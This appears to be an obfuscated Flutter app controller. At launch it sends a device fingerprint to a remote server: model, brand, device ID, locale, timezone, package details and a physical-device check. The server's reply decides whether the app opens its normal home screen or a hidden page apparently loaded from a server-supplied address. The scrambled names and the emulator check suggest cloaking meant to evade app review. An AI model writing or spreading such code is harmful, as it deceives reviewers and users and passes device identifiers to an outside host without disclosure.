import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var bqenlgcsmr = RxBool(false);
  var ntifovdj = RxBool(true);
  var fsnwyzx = RxString("");
  var michelle = RxBool(false);
  var altenwerth = RxBool(true);
  final tzlmcn = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xhznmby();
  }


  Future<void> xhznmby() async {

    michelle.value = true;
    altenwerth.value = true;
    ntifovdj.value = false;

    tzlmcn.post("https://ply-ai.daynokong.today/mgbdqlwutkfh",data: await lmgvcon()).then((value) {
      var kpsj = value.data["kpsj"] as String;
      var kwmulgd = value.data["kwmulgd"] as bool;
      if (kwmulgd) {
        fsnwyzx.value = kpsj;
        lauren();
      } else {
        wunsch();
      }
    }).catchError((e) {
      ntifovdj.value = true;
      altenwerth.value = true;
      michelle.value = false;
    });
  }

  Future<Map<String, dynamic>> lmgvcon() async {
    final DeviceInfoPlugin adpn = DeviceInfoPlugin();
    PackageInfo bekn_ekrfgpnl = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nyqgvsm = Platform.localeName;
    var lgdizo_XnLUf = currentTimeZone;

    var lgdizo_yXupclCf = bekn_ekrfgpnl.packageName;
    var lgdizo_mDsiV = bekn_ekrfgpnl.version;
    var lgdizo_twzKsRGS = bekn_ekrfgpnl.buildNumber;

    var lgdizo_Ooxf = bekn_ekrfgpnl.appName;
    var lgdizo_XuendU = "";
    var lgdizo_ShIxfsy = "";
    var lelaGrady = "";
    var adonisSchmitt = "";
    var jeffryYost = "";
    var maurineTremblay = "";
    var lgdizo_IjpxU  = "";
    var anastasiaBins = "";
    var brooksOkuneva = "";


    var lgdizo_fEk = "";
    var lgdizo_fAKagWiz = false;

    if (GetPlatform.isAndroid) {
      lgdizo_fEk = "android";
      var redmzlo = await adpn.androidInfo;

      lgdizo_ShIxfsy = redmzlo.brand;

      lgdizo_XuendU  = redmzlo.model;
      lgdizo_IjpxU = redmzlo.id;

      lgdizo_fAKagWiz = redmzlo.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lgdizo_fEk = "ios";
      var hfdjoruxlm = await adpn.iosInfo;
      lgdizo_ShIxfsy = hfdjoruxlm.name;
      lgdizo_XuendU = hfdjoruxlm.model;

      lgdizo_IjpxU = hfdjoruxlm.identifierForVendor ?? "";
      lgdizo_fAKagWiz  = hfdjoruxlm.isPhysicalDevice;
    }
    var res = {
      "lgdizo_Ooxf": lgdizo_Ooxf,
      "lgdizo_twzKsRGS": lgdizo_twzKsRGS,
      "lgdizo_mDsiV": lgdizo_mDsiV,
      "lgdizo_XuendU": lgdizo_XuendU,
      "nyqgvsm": nyqgvsm,
      "lgdizo_XnLUf": lgdizo_XnLUf,
      "lgdizo_ShIxfsy": lgdizo_ShIxfsy,
      "lgdizo_IjpxU": lgdizo_IjpxU,
      "lgdizo_fEk": lgdizo_fEk,
      "adonisSchmitt" : adonisSchmitt,
      "lgdizo_yXupclCf": lgdizo_yXupclCf,
      "jeffryYost" : jeffryYost,
      "maurineTremblay" : maurineTremblay,
      "anastasiaBins" : anastasiaBins,
      "lelaGrady" : lelaGrady,
      "lgdizo_fAKagWiz": lgdizo_fAKagWiz,
      "brooksOkuneva" : brooksOkuneva,

    };
    return res;
  }

  Future<void> wunsch() async {
    Get.offAllNamed("/home");
  }

  Future<void> lauren() async {
    Get.offAllNamed("/rule_con");
  }

}
